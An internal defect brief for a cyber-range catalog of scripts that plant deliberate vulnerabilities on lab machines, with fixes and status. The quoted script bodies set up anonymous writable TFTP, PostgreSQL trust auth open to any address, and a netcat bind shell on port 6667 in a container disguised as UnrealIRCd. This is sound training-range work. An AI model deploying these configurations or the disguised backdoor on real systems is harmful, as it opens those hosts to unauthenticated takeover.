# Upstream defect handoff — vulndb catalog + nakon

**Purpose.** A self-contained brief for the agent that owns the **vulndb catalog** (vulndb-ui:
MySQL + HTTP API + MinIO; `vulndb-cli` is the sanctioned client) and the **nakon** repo. These are
the defects that are *not* fixable from `tezcatlipoca` — they live in the shared catalog scripts or
in nakon itself. Each is currently worked around driver-side (mostly by pruning the config from pin
sets), which is why they keep resurfacing.

> Give this file to the agent with catalog + nakon access. Every item below has: symptom, root
> cause as far as we proved it, the exact script body as rendered by a recent bundle (evidence), the
> required fix, and acceptance criteria.

## Resolution status (2026-10-02)

Resolved and verified live on noble (24.04), debian13 and fedora44 — bodies and evidence in
[`vulndb-fixes/`](vulndb-fixes/), and removed from `constants.KNOWN_BROKEN_CONFIGS`:

| item | outcome |
|---|---|
| 1 `sshd-force-sftp-broken-chroot` | **The stated root cause was wrong.** OpenSSH 9.6p1/10.0p2/10.2p1 all accept `Match Group sftpusers` with the group missing (`sshd -t` rc=0, restart rc=0). The real defect was the *inverse*: the group was never created, so the Match block could never match anyone (an inert plant) and `reload || true` hid the reload result. Fixed body creates the group, validates with `sshd -t`, detects the `ssh`/`sshd` unit and propagates the reload rc. |
| 2 `tftpd-hpa-anon-write` | **The stated root cause was wrong.** No exit 82, `dpkg --audit` empty on noble. The real defect: the postinst starts the daemon with shipped options and `enable --now` is a no-op on a running unit, so the rewritten `/etc/default/tftpd-hpa` was never loaded and anonymous **write** was refused (curl rc=68). Fixed body restarts the unit, injects `-s -c -p` via a systemd drop-in on the socket-activated Fedora path, asserts dpkg is clean, and round-trips an unauthenticated upload. |
| 3 `postgresql-no-auth` + `postgresql-remote-access` | **Reproduced, and worse than documented on Fedora** (the Debian-only `pg_ctlcluster`/`pg_lsclusters` init left the cluster uninitialised and the service `failed`, all hidden by `|| true`). On noble/debian the local-trust finding never landed (`sed` missed the shipped `local all postgres peer` line), and `listen_addresses` silently no-opped because the shipped conf has spaces around `=`. Both fixed; `depends_on` kept. |
| 4 `unrealircd-backdoor-container` | **Reproduced** (`docker: command not found`, rc=127). Fixed body detects/installs docker or podman and otherwise exits rc=1 with a `MISSING DEPENDENCY` message. |
| 5 Windows pins | **The stated root cause was wrong, and only one row is really broken.** Four of the five never touch an account or password policy; the fifth already created its account before applying flags and re-runs clean (measured live 2026-10-02 on lab vmid 131). The real defects were a string-vs-integer flag comparison (`local-user-win`), a terminating `Set-ExecutionPolicy` under nakon's Process-scope Bypass (`powershell-execution-unrestricted`), non-existent feature/property names (`rpc-proxy-on-dc-web-win`), and a prerequisite gap dressed as a script bug (`unauth-kiosk-app-startup-win`) — all four fixed and removed from `KNOWN_BROKEN_CONFIGS`. `mailenable-cleartext-mail-win` is genuinely broken and stays listed: `choco install mailenable` names a package the community feed does not have. |
| 6 `local-user` | **Closed.** The live catalog already carries the portable fix, and there is no seed file to revert it. |

Still open: **item 5's `mailenable-cleartext-mail-win` only** (the other four are fixed and verified;
see the item-5 table for the corrected root causes), and the nakon half of **items 7-8** (partially
landed — see those sections). **Item 9 was a stale doc**, not a defect.

The root-cause text below each heading is the brief as it was written; where the status above
corrects it, the status wins.

## Ground rules

- **Back up the catalog first:** `python3 -m vulndb_cli backup --yes`.
- **Non-interactive:** every write needs `--yes` (stdin is not a terminal for an agent).
- Get the current body before editing: `python3 -m vulndb_cli get <name>` (this build has no
  `--json` flag on `get`; it prints pretty JSON).
- Apply script changes with `python3 -m vulndb_cli update <name> --script-file <file> --yes`.
- **Record every applied catalog fix** in `tezcatlipoca`'s `docs/vulndb-fixes/`: one `.sh` file with
  the new body plus a row in that directory's README table (`name | platform | file | why | applied`).
  That directory is the reviewable record for a catalog that is a live shared service, not a repo.
- **Never hard-code a distro detail** (admin group name, package manager, unit name, pg version).
  The lesson from `local-user` is that Debian-isms fail `rc=6`/`rc=127` on Fedora/Alpine.
- **Scripts must stay idempotent** — phase 5 re-runs over already-planted boxes, and a repair pass
  replants subsets.
- Do not silence configuration-validation failures with `|| true`. Two of the defects below exist
  precisely because a failure was swallowed.

---

## 1. `sshd-force-sftp-broken-chroot` (linux) — the sftp group was never created

**Symptom.** After the plant, the box takes SSH fine; at the *next* sshd restart, SSH dies entirely.
`sshd -t` reports a fatal config error. This one pin took down red's footholds, blue's hunts, the
verifier's misconfig check, and phase 6's DNS step in `scrim-extreme-cyberfield-2026-09-22`.

**Root cause (confirmed by reading the rendered script).** It appends a `Match Group sftpusers`
block but never creates the group. sshd treats a `Match` on a nonexistent group as a **fatal**
config error, and the reload failure is hidden by `|| true`.

**Current body (verbatim from bundle `afd4d14d180ea971/plans/05921709839c67d3`):**

```bash
#!/bin/bash
set -e
cat >> /etc/ssh/sshd_config <<'EOF'
Match Group sftpusers
    ForceCommand internal-sftp
    ChrootDirectory /
EOF
systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || true
```

**Required fix.** Create the group when it is missing (`getent group sftpusers >/dev/null ||
groupadd sftpusers`) before the `Match` block; run `sshd -t` after the edit and fail the step loudly
if the config is invalid; do not swallow the reload failure (check `sshd -t` first, then reload and
propagate the rc). Consider `Match User` if the finding is meant to target the planted account
rather than a group.

**Acceptance.** Plant → `sshd -t` rc=0 → `systemctl restart ssh` → SSH and guest-agent auth still
work; the finding (`internal-sftp` force-command + chroot) is still present in the live config.

---

## 2. `tftpd-hpa-anon-write` (linux) — the planted options were never loaded

**Symptom.** On Noble, installing `tftpd-hpa` makes the postinst exit 82. dpkg is left half-configured
and **every later apt/dpkg step on the box fails in cascade** — it looks like ~8 broken configs with
one real cause (observed in `scrim-extreme-cyberfield-2026-09-22`).

**Current body (verbatim from bundle `afd4d14d180ea971/plans/0d281d863bc6bba2`):**

```bash
#!/bin/bash
set -e
if command -v apt-get >/dev/null; then
    DEBIAN_FRONTEND=noninteractive apt-get install -y tftpd-hpa
elif command -v dnf >/dev/null; then dnf install -y tftp-server; fi
root=/var/lib/tftpboot
mkdir -p "$root"
if [ -f /etc/default/tftpd-hpa ]; then
    sed -i 's#^TFTP_DIRECTORY=.*#TFTP_DIRECTORY="/var/lib/tftpboot"#' /etc/default/tftpd-hpa
    sed -i 's#^TFTP_OPTIONS=.*#TFTP_OPTIONS="--secure --create --permissive"#' /etc/default/tftpd-hpa
else
    printf 'TFTP_DIRECTORY="/var/lib/tftpboot"\nTFTP_OPTIONS="--secure --create --permissive"\n' \
        > /etc/default/tftpd-hpa
fi
chmod 777 "$root"
systemctl daemon-reload
systemctl enable --now tftpd-hpa 2>/dev/null || systemctl enable --now tftp.socket 2>/dev/null || true
# --create + --permissive + 0777 root: unauthenticated read AND write of arbitrary
# files, which is how the leaked keys below become fetchable with one curl/tftp.
```

**Required fix.** Reproduce on a clean Noble box and pin down why the postinst exits 82 (debconf
preseed, the `tftpd-hpa` unit's socket activation, or an inetd dependency are the usual causes).
Make the plant survive it: pre-seed debconf, and after the install assert dpkg is clean
(`dpkg --configure -a` / `dpkg -C` empty) and fail the step loudly if not — rather than leaving a
wedged package manager that silently breaks every subsequent config. Keep the finding itself intact
(anon read/write TFTP root).

**Acceptance.** On Noble, the plant completes, `dpkg -C` is empty, the service serves an
unauthenticated read+write, and *every later config on the box still installs*.

---

## 3. `postgresql-no-auth` + `postgresql-remote-access` (linux) — known-bad pair

**Symptom.** `postgresql-remote-access` is used to expose Postgres with `trust` auth, but it depends
on the already-known-bad `postgresql-no-auth`, so the pair is pruned from Noble pin sets wholesale.

**Current bodies (verbatim from bundles `018638e86c50db03` and `f68179337fe3cdb6`):**

```bash
# postgresql-no-auth
#!/bin/bash
set -e
if command -v apt-get &> /dev/null; then
	DEBIAN_FRONTEND=noninteractive apt-get install -y postgresql
elif command -v dnf &> /dev/null; then
	dnf install -y postgresql-server
	pg_ctlcluster $(pg_lsclusters -h | head -1 | awk '{print $1, $2}') init 2>/dev/null || true
elif command -v yum &> /dev/null; then
	yum install -y postgresql-server
	initdb /var/lib/pgsql/data 2>/dev/null || true
fi
for hba in /etc/postgresql/*/main/pg_hba.conf /var/lib/pgsql/data/pg_hba.conf; do
	[ -f "$hba" ] || continue
	sed -i 's/^local.*all.*all.*peer/local   all             all                                     trust/' "$hba"
	sed -i 's/^host.*all.*all.*127.0.0.1\/32.*scram-sha-256/host    all             all             127.0.0.1\/32            trust/' "$hba"
	sed -i 's/^host.*all.*all.*::1\/128.*scram-sha-256/host    all             all             ::1\/128                 trust/' "$hba"
done
systemctl enable postgresql 2>/dev/null || systemctl enable postgresql-14 2>/dev/null || true
systemctl restart postgresql 2>/dev/null || systemctl restart postgresql-14 2>/dev/null || true
```

```bash
# postgresql-remote-access
#!/bin/bash
set -e
for conf in /etc/postgresql/*/main/postgresql.conf /var/lib/pgsql/data/postgresql.conf; do
	[ -f "$conf" ] || continue
	sed -i "s/^#*listen_addresses=.*/listen_addresses = '*'/" "$conf"
done
for hba in /etc/postgresql/*/main/pg_hba.conf /var/lib/pgsql/data/pg_hba.conf; do
	[ -f "$hba" ] || continue
	echo "host    all             all             0.0.0.0/0               trust" >> "$hba"
	echo "host    all             all             ::0/0                   trust" >> "$hba"
done
systemctl restart postgresql 2>/dev/null || systemctl restart postgresql-14 2>/dev/null || true
```

**Required fix.** Make both distro- and version-portable, then prove them on Noble, Debian 13 and
Fedora:
- Do not assume the Debian unit names (`postgresql`, `postgresql-14`, `pg_ctlcluster`,
  `pg_lsclusters`); detect the real unit/cluster (`systemctl list-units 'postgresql*'`,
  `pg_lsclusters` only when present) and `initdb` on the RPM path.
- Drive `pg_hba.conf` by *rewriting* the auth method for existing host lines and validating the
  result (`pg_hba_file_rules` / a real `psql` connect), instead of `sed` patterns that silently
  no-op when the shipped line differs (`scram-sha-256` vs `md5`, `peer` vs `ident`).
- Confirm the server actually restarted (check `pg_isready`), not `|| true`.
- `postgresql-remote-access` should not depend on the `postgresql-no-auth` script; each should be
  independently plantable.

**Acceptance.** On each target distro: install → restart succeeded → `psql` connects per the finding
(local trust and/or remote trust) → `pg_isready` rc=0. Declare/refresh the dependency so
`remote-access` no longer drags in the broken script.

---

## 4. `unrealircd-backdoor-container` (linux) — assumes docker, fails rc=127

**Symptom.** The step fails `rc=127` on any box without docker (`docker: command not found`), and
the service never comes up. Currently documented driver-side and caught only by verify's
plant-coverage gate.

**Current body (verbatim from bundle `afd4d14d180ea971/plans/05921709839c67d3`):**

```bash
#!/bin/bash
set -e
# Persistence disguised as a chat service: a container tagged like a known-good
# UnrealIRCd release that listens on 6667 and calls home.
image="unrealircd-backdoor:3.2.8.1"
if [ -n "$IMAGE_TARBALL" ] && [ -f "$IMAGE_TARBALL" ]; then
    docker load -i "$IMAGE_TARBALL"
elif ! docker image inspect "$image" >/dev/null 2>&1; then
    build=$(mktemp -d)
    cat > "$build/Dockerfile" <<'DF'
FROM alpine:3.20
RUN apk add --no-cache busybox-openrc syslog-ng || true
EXPOSE 6667
CMD ["sh","-c","while true; do nc -l -p 6667 -k -e /bin/sh 2>/dev/null || nc -L -p 6667 2>/dev/null || sleep 5; done"]
DF
    docker build -q -t "$image" "$build" >/dev/null
    rm -rf "$build"
fi
docker rm -f unrealircd-backdoor >/dev/null 2>&1 || true
docker run -d --name unrealircd-backdoor --restart unless-stopped \
    --label com.starbars.service=irc -p 6667:6667 "$image"
# Blue-team lesson: a container whose *name and tag* impersonate legitimate software.
```

**Required fix.** Either declare a hard dependency on a docker-install config and let nakon order it,
or make the script ensure a container runtime (install `docker.io`/`podman-docker` via the detected
package manager) and fail with an actionable message when it cannot. The script must not die
`rc=127` mid-plant.

**Acceptance.** On a docker-capable box: rc=0, container listening on 6667. On a box with no runtime
and no way to install one: rc!=0 with a message naming the missing dependency (never a bare 127, and
never a half-configured dpkg — see item 2).

---

## 5. Windows misconfiguration pins — the account/password-policy diagnosis was WRONG

**Status (measured 2026-10-02 on lab vmid 131, `tz-vulnlab-w1`).** The earlier claim in this item was
an inference from three *other* names seen failing a second pass in
`scrim-extreme-cyberfield-2026-09-22` (`Elevate Guest Account`, `never-expires-service-account-win`,
`iis-webshell`) — none of which are in this set. It was then attached to five rows whose bodies
nobody had read, because the bundles carrying them had lost their blobs. Running the real bodies
disproves it: **four of the five never touch an account or password policy at all**, and the fifth
already creates the account before applying flags and is rc=0 on a second plant. There is no
account-creation-vs-policy ordering problem in this set, and no `Set-LocalUser` /
password-policy failure in any of them.

| row | what actually happened | verdict |
|---|---|---|
| `local-user-win` | account created first and re-runs clean; `PASSWORD_NEVER_EXPIRES -eq 1` compares nakon's **string** `"1"` to an **integer**, so the flag silently no-opped and `net user` kept a finite expiry. Flag was also only applied on the create path. | fixed in catalog 2026-10-02 (compare `-eq '1'`, re-assert after either path) |
| `powershell-execution-unrestricted` | rc=1 with no account involved: nakon runs each step with `-ExecutionPolicy Bypass` (Process scope beats LocalMachine), so `Set-ExecutionPolicy -Scope LocalMachine` raised a *terminating* `SecurityException`, which `-ErrorAction Ignore`/`SilentlyContinue`/`try/catch` all leave in `$Error` → nakon rc=1, and the three registry writes below it never ran. | fixed in catalog 2026-10-02 (write the LocalMachine policy value directly; `-Force` writes) |
| `rpc-proxy-on-dc-web-win` | no account involved; the apps and the `RPCPROXY` ISAPI handler did get created on a box with IIS + `RPC-over-HTTP-Proxy`, but `Install-WindowsFeature RSAT-Rpc-Proxy` names a feature that exists on no Server SKU, and `poolManagementMode` is not an IIS property, so the body emitted `Target configuration object '.../applications[@name="/Rpc"]' is not found` on every run. | fixed in catalog 2026-10-02 (real role name, prerequisite throw, `ValidPorts`/`Enabled` re-assert) |
| `unauth-kiosk-app-startup-win` | no account involved; with its declared app tree present it already works (`0.0.0.0:80`, `HTTP 200`, rc=0 twice). Absent tree / no `python` on PATH → `Start-Process : ... 'FilePath'. The argument is null or empty`, i.e. a prerequisite gap dressed up as a script bug; it also returns rc=0 when another listener already owns the port. | fixed in catalog 2026-10-02 (explicit missing-interpreter throw + non-fatal liveness warning) |
| `mailenable-cleartext-mail-win` | no account involved; the row installs nothing — `choco install mailenable` fails because the community feed has **no `mailenable` package**. Chocolatey and the network are fine, so this is a wrong-package-ID bug, **not** the environmental network/TLS failure this item predicted. Only the `MailEnable-Cleartext` firewall rule lands, so the documented cleartext POP3/IMAP weakness is absent. | **still broken** — unapplied candidate in `docs/vulndb-fixes/mailenable-cleartext-mail-win.candidate`; see that file for what blocked verification |

**Required fix (revised).** Do not add account ordering — there is nothing to reorder. Fix each row on
its own measured defect: string-vs-integer flag comparisons against nakon's rendered vars; a
`Set-ExecutionPolicy` call that must be *avoided* (not error-suppressed) when a more specific scope
exists; feature/property names that do not exist; a prerequisite gap that must be reported as one; and
MailEnable's real acquisition path. The finding in each row must still be present afterwards.

**Acceptance.** Plant twice in a row: rc=0 both times, and the finding verified live on the box
(account property actually set; execution policy + `EnableScripts` actually present; `/Rpc` +
`/RpcWithCert` mapped to the `RPCPROXY` handler with non-empty `ValidPorts`; something actually
listening on the kiosk port). The four fixed rows' evidence is in `docs/vulndb-fixes/README.md`.

---

## 6. `local-user` (linux) — keep the distro-portable fix in the source of truth

**Status.** Already fixed in the live catalog; recorded in `tezcatlipoca/docs/vulndb-fixes/local-user-linux.sh`
(the old body did `usermod -a -G sudo`, which fails `rc=6` on Fedora where the admin group is `wheel`).

**Required work.** (a) Confirm the live catalog row matches that recorded body. (b) Fix the *source
of truth* so a fresh catalog load keeps it — the fixed body currently lives in a DB row plus a
tezcatlipoca doc, and a `restore-backup`/fresh seed would silently revert it. (c) Add a
distro-portability check so an admin-group name is never hard-coded again.

**Acceptance.** A fresh catalog load yields the portable body; a regression test (or `catalog check`)
fails on a script that hard-codes `sudo`/`wheel`.

---

## 7. `nakon randomize` drops required vars (nakon repo)

> **Status 2026-10-02:** the catalog half landed in nakon `f86c11d` — `catalog check` reports
> `missing-vars` for a bare/incomplete pin, and rows expose `required_vars`. `randomize` itself was
> deliberately left unchanged (the driver filters unplantable bare names itself, see
> `nakon_ops._drop_unplantable_bare`), so a direct `randomize` call can still return such a name;
> the durable fix is still a `required_vars` column in the catalog rather than a derived scan.

**Symptom.** `nakon randomize` returns names without the vars some configs require, and pinned
`box_vulns.json` stores plain strings — so a config like `hosts-redirect-linux` (requires `IP`) or
`sudoers-rule` (requires a rule) plants `rc=2` ("IP is required"). Surfaced by the strict golden
plant.

**Required fix (nakon repo).** Give the catalog/nakon a notion of required vars: either a
`requires`/`required_vars` field on the configuration, or derive it by scanning the body for
`${VAR:?...}` / `$VAR` references. Then: `randomize` must satisfy or exclude entries it cannot fill;
`nakon catalog check` should fail a config whose declared/derived required vars are unsatisfiable;
and a bare-name pin of a var-requiring config should be a generate-time error with the exact fix.

**Acceptance.** `nakon randomize` output plants without hand-editing; `catalog check` catches a
missing-var pin before deploy. (The driver side already fails fast for `REQUIRED_VARS`; this is the
catalog/upstream half.)

---

## 8. Windows package-manager fallback is untested (nakon repo)

> **Status 2026-10-02:** partially landed in nakon `12c3195` — the step now writes `.nakon-step-rc`
> and the docstring/marker state plainly what is and is not verified. Still **not** exercised against
> real winget/chocolatey on Windows. Choco-on-winget-*failure* was deliberately not added (the branch
> is unreachable from the current catalog).

**Symptom.** `nakon/gen/powershell.py`'s `render_package_step()` docstring says the winget→choco
fallback "has never been exercised", and the generated script carries an `# UNTESTED:` marker. On
Server SKUs winget is frequently absent.

**Required fix.** Either exercise it on a real Windows box and record the result, or delete the
fallback and require an explicit package source. If it stays: prefer choco/direct MSI when winget is
missing, and fail with the package name in the message.

**Acceptance.** A documented live run (or an offline test of the rendered script) showing a package
install through the fallback, plus the docstring/marker updated to say what was verified and when.

---

## 9. `install_package` ignores exit status (nakon repo) — silent service-down

> **Status 2026-10-02:** closed as a **stale doc** — there is no `install_package` in current nakon.
> The generated package step ends on the real apt/dnf/yum/apk command and its rc is recorded into
> `report.tsv` and the FAILED tally (reproduced with a stub `apt-get`: rc42 → `rc=42`, `failed=1`).

**Symptom.** `install_package` ignores the package-manager exit status and the deploy never raises,
so a box that failed every install looks identical to a healthy one from the deploy log. This is why
a range can come up with every scored service down while Terraform exits 0.

**Required fix.** Capture and surface the rc per package step (the driver already counts `FAILED`
step lines into `nakon_failed_steps`; make the install step actually emit a failure when the manager
fails). Non-fatal is fine — silent is not.

**Acceptance.** A deliberately failing install appears as a `FAILED` step with its rc in the TSV and
in the driver's tally.

## 10. `Domain Join` cannot re-join an already-joined member (nakon repo) — dead trust after a DC reset

> **Status 2026-10-04:** OPEN. Live-found during the per-box-reset matrix
> ([reset-live-test-2026-10-03-report.md](reports/reset-live-test-2026-10-03-report.md), F6).

**Symptom.** After a team's DC is reset and re-promoted (redeploy rollback-base/rebuild, or the
new `--mode reset` ladder), the member's machine account no longer exists in the fresh AD — but
the member still self-reports "joined". The chain's `Domain Join` config then runs
`Add-Computer`, which refuses: *"Cannot add computer to domain because it is already in that
domain"* (rc=1). The member's trust is silently dead: domain-credential scoring against that
member fails, and the driver-side skip/verify logic (which probes the member, not the DC) reads
the state as healthy.

**Required fix.** The `Domain Join` step needs a trust-repair branch when the target machine
already believes it is in the target domain: `Test-ComputerSecureChannel -Repair` (covers a
stale machine-account password) falling back to `Remove-Computer` → reboot → `Add-Computer`
(covers a machine account that no longer exists on the DC — the actual post-reset case).

**Acceptance.** On a range whose DC was re-promoted: forcing the domain chain re-run leaves a
machine account for the member on the DC (`Get-ADComputer`), and domain-credential checks score
again. Repro: reset-test 2026-10-04 — `Get-ADComputer` on the re-promoted DC listed only the DC
itself while ftp01 self-reported joined.

---

## 11. `nakon deploy` fails a 0-step plan as a credential failure (nakon repo) — FIXED

> **Status 2026-10-05:** FIXED upstream in nakon `22360ba` (`deploy/runner.py`: the "no output from
> the remote plan" error now fires only when the plan had steps); the driver workaround
> (`_reconcile_zero_step_machines`) is removed. Contract pinned by `tests/test_zero_step_plan.py`.
> Delete this section once the pin lands in a nakon release.

---

## Definition of done

1. Every catalog change applied via `vulndb-cli`, then **re-read** (`get --json`) to confirm the row.
2. Every applied script fix recorded in `tezcatlipoca/docs/vulndb-fixes/` (file + README row).
3. Each item verified on the distros it claims (`noble`, `debian13`, `fedora`, `alpine` where
   relevant) and on a Windows box for items 5 and 8.
4. No config left with a swallowed validation failure, and no postinst that can wedge dpkg.
5. `tezcatlipoca`'s `KNOWN_BROKEN_CONFIGS` (see `constants.py`) can then be shrunk — tell that repo
   which names are fixed so the guard list and the pin-prune lists are updated together.
